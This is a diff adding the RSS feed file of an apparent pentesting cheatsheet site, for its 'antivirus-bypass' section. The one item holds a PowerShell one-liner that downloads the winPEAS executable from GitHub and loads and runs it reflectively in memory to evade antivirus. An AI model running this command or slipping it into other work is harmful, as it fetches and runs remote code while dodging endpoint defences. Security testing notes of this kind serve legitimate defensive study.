@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>www.tagnull.de</title>
+    <link>https://www.tagnull.de/docs/Cheatsheet/antivirus-bypass/</link>
+    <description>Recent content on www.tagnull.de</description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <atom:link href="https://www.tagnull.de/docs/Cheatsheet/antivirus-bypass/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>reflective code loading</title>
+      <link>https://www.tagnull.de/docs/Cheatsheet/antivirus-bypass/reflective-code-loading/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://www.tagnull.de/docs/Cheatsheet/antivirus-bypass/reflective-code-loading/</guid>
+      <description> powershell # $url = &amp;#34;https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe&amp;#34; $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest &amp;#34;$url&amp;#34; -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(&amp;#34;log&amp;#34;) </description>
+    </item>
+  </channel>
+</rss>
